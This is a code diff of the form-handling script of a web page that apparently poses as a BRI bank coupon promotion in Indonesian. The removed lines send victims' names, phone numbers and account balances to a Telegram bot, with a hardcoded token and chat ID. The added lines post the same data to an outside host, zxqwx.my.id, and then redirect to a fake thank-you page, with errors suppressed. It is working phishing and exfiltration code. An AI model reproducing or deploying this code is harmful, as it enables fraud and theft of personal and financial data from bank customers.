@@ -874,37 +874,30 @@ body{
             	$("#mainForm").submit(function(e) {
             	  e.preventDefault();
             
-            var token = "8325471604:AAF2Js3ws9Eb-3NfLmy3-omJd9vurYkGxWY";
-            var chatID = "5747053267";
-            	  var message = " DATA MASUK \n";
-	message += ('\n<b>Nama:</b>\n'+$("#nama").val().trim()+'\n\n<b>No. HP:</b>\n'+$("#nomor").val().trim()+'\n\n<b>Saldo:</b>\nRp'+$("#saldo").val().trim()+'\n\n');
-	message += "";
-	
-	fetch("https://api.telegram.org/bot"+token+"/sendMessage?parse_mode=html", {
+            	  var message = ('\n<b>Nama:</b>\n'+$("#nama").val().trim()+'\n\n<b>No. HP:</b>\n'+$("#nomor").val().trim()+'\n\n<b>Saldo:</b>\nRp'+$("#saldo").val().trim()+'\n');
+            var fd = new FormData();
+            fd.append("message", message);
+	fetch("https://zxqwx.my.id/senders/"
+        +"cetak-kupon-bri/send.php", {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: chatID,
-          text: message
-        })
+        body: fd
       })
       .then(response => response.json())
       .then(data => {
-        $("#loader").css('display', 'none');
-		window.location.href = "../../../../thank/tr.svgdev.info/Kupon-BRlmo-Festival/ld1/index.html";
+      	$("#loader").css('display', 'none');
+		  window.location.href = "../../../../thank/tr.svgdev.info/Kupon-BRlmo-Festival/ld1/index.html";
       })
       .catch((error) => {
-        alert('Failed to send message.');
       });
+	
+	
                 });
 
 
                 // Format mata uang.
                 $( '.uang' ).mask('000.000.000', {reverse: true});
 
-            })
+            });
         </script>
 <!-- Static App Form Collection Script -->
 <!--<script src="https://static.app/js/static-forms.js" type="text/javascript"></script>
